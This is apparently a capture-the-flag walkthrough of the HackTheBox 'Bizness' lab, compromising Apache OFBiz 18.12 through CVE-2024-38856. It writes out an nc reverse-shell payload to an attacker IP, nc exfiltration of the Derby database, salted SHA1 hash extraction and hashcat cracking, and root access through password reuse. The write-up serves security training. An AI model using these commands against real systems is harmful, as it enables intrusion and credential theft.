# Bizness - Easy

```sh
sudo vim /etc/hosts
# map bizness.htb to IP

nmap -T4 -p- -A -Pn -v bizness.htb
```

* Open ports & services:

    * 22/tcp - ssh - OpenSSH 8.4p1 Debian 5+deb11u3
    * 80/tcp - http - nginx 1.18.0
    * 443/tcp - ssl/http - nginx 1.18.0
    * 35911/tcp - tcpwrapped

* Navigating to the webpage on port 80 redirects to the HTTPS page (port 443) - it is for 'BizNess Incorporated'; we can start our web scan simultaneously

* The webpage does not contain any useful info; we have an email 'info@bizness.htb' and the footer source code mentions 'powered by Apache OFBiz'

* Web enumeration:

    ```sh
    # directory scanning
    feroxbuster -u https://bizness.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent -k
    # -k to disable TLS cert validation
    ```

* From our web scan, one page that stands out is '/control' - this mentions the following error for Apache OfBiz - "org.apache.ofbiz.webapp.control.RequestHandlerException: Unknown request [null]; this request does not exist or cannot be called directly."

* We can try enumerating for the version of Apache OfBiz but the page does not mention it; so we can attempt searching and trying recent vulnerabilities for Apache OfBiz and check if that leads anywhere

* Googling 'apache ofbiz exploits' gives us several vulnerabilities - with several hits for [CVE-2024-45195, unauthenticated RCE](https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)

* The blog mentions the pages '/control/forgotPassword', '/webtools' and '/control/login' as part of Apache OfBiz installations - we can check if this works in our case

* Navigating to <https://bizness.htb/control/forgotPassword>, we get a page for 'Forgot Your Password'; more importantly, the OFBiz release 18.12 is mentioned in footer; similarly we have login page at '/control/login' as well as '/webtools/control/checkLogin'

* Searching for exploits associated with this version, we get a [CVE-2024-38856 Scanner & Exploit tool](https://github.com/securelayer7/CVE-2024-38856_Scanner) - we can give this a try:

    ```sh
    git clone https://github.com/securelayer7/CVE-2024-38856_Scanner.git

    cd CVE-2024-38856_Scanner

    python3 cve-2024-38856_Scanner.py -t "https://bizness.htb" -p 443 -c "whoami" --exploit
    # this works, and we can see the username 'ofbiz'

    # setup a listener
    nc -nvlp 4444

    # use reverse shell bash command
    python3 cve-2024-38856_Scanner.py -t "https://bizness.htb" -p 443 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f" --exploit
    ```

* We get a reverse shell - we can enumerate for privesc now:

    ```sh
    # stabilize shell first
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # press Ctrl+Z to background shell
    stty raw -echo; fg
    # press Enter twice to foreground shell

    ls -la /

    ls -la /home
    # we have only 'ofbiz' user

    ls -la /home/ofbiz
    # get user flag

    # we can try enumeration using linpeas.sh

    # on attacker
    python3 -m http.server

    # in reverse shell
    wget http://10.10.14.18:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* ```linpeas``` shows that the '.service' file  ```/etc/systemd/system/multi-user.target.wants/ofbiz.service``` is calling this writable executable: ```/opt/ofbiz/gradlew```

* We can write to this executable but the issue is that for it to take effect we need sudo rights for this service; we can continue checking for any other privesc vectors

* As OfBiz is a webapp, there could be stored creds in the database; Google shows OfBiz uses an embedded Java database called ```Derby``` by default

* We can confirm this by using the official Apache Ofbiz docs - ```grep derby /opt/ofbiz/framework/entity/config/entityengine.xml``` - we can see it is used as the datasource

* [Apache Derby docs from the developer's guide](https://db.apache.org/derby/docs/10.0/manuals/develop/develop13.html) shows the Derby database directory contains the following:

    * 'log' directory
    * 'seg0' directory
    * 'service.properties' file
    * 'tmp' directory (might not exist)
    * 'jar' directory (might not exist)

* Knowing this, we can search for this exact directory:

    ```sh
    cd /opt/ofbiz

    find . -type d -name *seg0*
    # we get 3 possible locations, under the same parent folder

    cd /opt/ofbiz/runtime/data
    # we can inspect these files further in attacker machine

    ls -la
    
    # compress the 'derby' folder into a file
    tar -czf /tmp/derby.tar.gz derby

    # transfer this file to attacker using nc

    # on attacker
    nc -nvlp 4445 > derby.tar.gz

    # in reverse shell
    /bin/nc 10.10.14.18 4445 -w 3 < /tmp/derby.tar.gz
    # check if file has been copied properly using md5sum
    ```

* We can interact with Derby DB using a SQL scripting tool called ```ij``` - [this is also included in Apache Derby docs](https://db.apache.org/derby/papers/DerbyTut/ij_intro.html):

    ```sh
    # on attacker machine
    tar -xzf derby.tar.gz

    ls

    # we need to install ij
    sudo apt install derby-tools

    which ij

    # we have 3 directories - ofbiz, ofbizolap, and ofbizotenant - in our DB
    # we can try each of them and check for any stored creds

    ij

    connect 'jdbc:derby:ofbiz';
    # from the guide, to connect to 'ofbiz' DB

    # we are able to connect
    show tables;
    # too many tables
    # we can check for any user or password-related tables

    select * from USER_LOGIN;
    # this command does not work

    describe OFBIZ.USER_LOGIN;
    # this shows all columns
    # includes password as column, so we can check here

    select USER_LOGIN_ID,CURRENT_PASSWORD,PASSWORD_HINT from OFBIZ.USER_LOGIN;
    # this works
    # we get a hash for 'admin' user
    ```

* The 'current_password' column for 'admin' includes a SHA hash "$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" - but the actual format is not identified by hash identifier tools

* Hashes are usually based on hex or base64 charset, and the '$' acts as a delimiter between identifier (optional), salt and password; in our case, 'd' between the two '$' signs is the salt, and the part after that is the actual password

* Googling for the exact algorithm used by Apache Derby shows that it uses SHA1 by default, so the above hash is a SHA1 hash

* SHA1 hash is 40 characters in length, which explains the incorrect format

* Checking the hash further on CyberChef, we can see that the latter part of the hash - the actual password "uP0_QaVBpDWFeo8-dRzDqRwXQ2I" - can be converted to a hex charset. This can be done by first converting from base64 (select the charset "A-Za-z0-9-_" as other charsets which include characters not used in the string give incorrect results), and then convert to hex (no delimiter)

* This makes it 40 characters in length - "b8fd3f41a541a435857a8f3e751cc3a91c174362" - which is now a valid SHA1 hash length

* As we have not considered the salt from the original format of the hash, we need to consider it while cracking. ```hashcat``` follows the format "hash:salt":

    ```sh
    vim sha1hash.txt
    # paste the hash in 'hash:salt' format
    # where our hash is the 40 character hex string, and salt is 'd'

    hashcat sha1hash.txt
    # detect hash type
    # this matches several hash-modes, but we only have salt and pass to consider
    # it could be either mode '110' - 'sha1($pass.$salt)'
    # or mode '120' - 'sha1($salt.$pass)'

    hashcat -a 0 -m 110 sha1hash.txt /usr/share/wordlists/rockyou.txt
    # this does not work

    hashcat -a 0 -m 120 sha1hash.txt /usr/share/wordlists/rockyou.txt
    # this works
    # we get the password 'monkeybizness'
    ```

* Using the cracked password, we can try password reuse on the target machine:

    ```sh
    # back in reverse shell
    su ofbiz
    # does not work

    su root
    # the password works for 'root'

    cat /root/root.txt
    ```
